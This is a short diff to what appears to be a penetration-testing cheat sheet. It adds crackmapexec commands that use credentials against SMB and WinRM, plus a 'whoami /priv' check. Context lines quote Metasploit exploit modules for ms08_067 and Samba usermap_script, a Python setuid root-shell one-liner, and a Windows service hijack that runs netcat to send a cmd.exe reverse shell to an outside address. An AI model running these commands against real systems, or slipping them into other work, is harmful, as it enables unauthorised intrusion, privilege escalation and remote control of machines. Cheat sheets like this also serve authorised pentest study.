@@ -91,6 +91,8 @@ msf> use exploit/windows/smb/ms08_067_netapi
 msf> use exploit/multi/samba/usermap_script
 $ enum4linux -a <IP address>
 $ crackmapexec smb <IP address> --shares
+$ crackmapexec smb <IP address> --shares -u <username> -p '<password>'
+$ crackmapexec winrm <IP address> -u <username> -p '<password>'
 ```
 
 - CUPS (port 631)
@@ -344,6 +346,12 @@ $ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 C:\> sc.exe config <service> binPath=C:\Windows\Temp\nc.exe -e cmd.exe <IP address> <port>"
 C:\> sc.exe stop <service>
 C:\> sc.exe start <service>
+```
+
+- Whoami
+
+```
+C:\> whoami /priv
 ```
 
 #5. - Brute Force
